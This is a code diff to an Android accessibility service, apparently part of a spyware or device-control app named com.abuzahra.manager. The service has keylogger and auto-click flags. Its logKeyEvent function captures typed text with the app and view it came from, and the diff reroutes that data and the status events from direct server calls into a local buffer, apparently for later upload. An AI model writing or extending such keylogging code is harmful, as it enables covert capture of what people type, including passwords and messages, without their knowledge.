@@ -106,18 +106,13 @@ class MyAccessibilityService : AccessibilityService() {
         serviceInfo = info
 
         // Notify server that accessibility is enabled
-        CoroutineScope(Dispatchers.IO).launch {
-            try {
-                com.abuzahra.manager.api.ApiClient.sendEvent(
-                    com.abuzahra.manager.util.DeviceUtils.getDeviceId(this@MyAccessibilityService),
-                    "accessibility_enabled",
-                    mapOf(
-                        "status" to "connected",
-                        "service" to "MyAccessibilityService"
-                    )
-                )
-            } catch (_: Exception) {}
-        }
+        com.abuzahra.manager.EventBuffer.addEvent(
+            "accessibility_enabled",
+            mapOf(
+                "status" to "connected",
+                "service" to "MyAccessibilityService"
+            )
+        )
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
@@ -349,33 +344,22 @@ class MyAccessibilityService : AccessibilityService() {
     }
 
     private fun logKeyEvent(packageName: String, text: String, viewId: String, className: String) {
-        CoroutineScope(Dispatchers.IO).launch {
-            try {
-                com.abuzahra.manager.api.ApiClient.sendEvent(
-                    com.abuzahra.manager.util.DeviceUtils.getDeviceId(this@MyAccessibilityService),
-                    "key_event",
-                    mapOf(
-                        "package" to packageName,
-                        "text" to text.take(500),
-                        "view_id" to viewId,
-                        "class" to className
-                    )
-                )
-            } catch (_: Exception) {}
-        }
+        com.abuzahra.manager.EventBuffer.addEvent(
+            "key_event",
+            mapOf(
+                "package" to packageName,
+                "text" to text.take(500),
+                "view_id" to viewId,
+                "class" to className
+            )
+        )
     }
 
     override fun onInterrupt() {
-        // Handle service interruption - try to recover
-        CoroutineScope(Dispatchers.IO).launch {
-            try {
-                com.abuzahra.manager.api.ApiClient.sendEvent(
-                    com.abuzahra.manager.util.DeviceUtils.getDeviceId(this@MyAccessibilityService),
-                    "accessibility_interrupted",
-                    mapOf("timestamp" to System.currentTimeMillis())
-                )
-            } catch (_: Exception) {}
-        }
+        com.abuzahra.manager.EventBuffer.addEvent(
+            "accessibility_interrupted",
+            mapOf("timestamp" to System.currentTimeMillis())
+        )
     }
 
     override fun onDestroy() {
@@ -384,16 +368,11 @@ class MyAccessibilityService : AccessibilityService() {
         keyloggerEnabled = false
         autoClickEnabled = false
         
-        // Notify server
-        CoroutineScope(Dispatchers.IO).launch {
-            try {
-                com.abuzahra.manager.api.ApiClient.sendEvent(
-                    com.abuzahra.manager.util.DeviceUtils.getDeviceId(this@MyAccessibilityService),
-                    "accessibility_destroyed",
-                    mapOf("status" to "disconnected")
-                )
-            } catch (_: Exception) {}
-        }
+        // Buffer event locally
+        com.abuzahra.manager.EventBuffer.addEvent(
+            "accessibility_destroyed",
+            mapOf("status" to "disconnected")
+        )
     }
 
     // ===== AUTOMATED ACTIONS =====
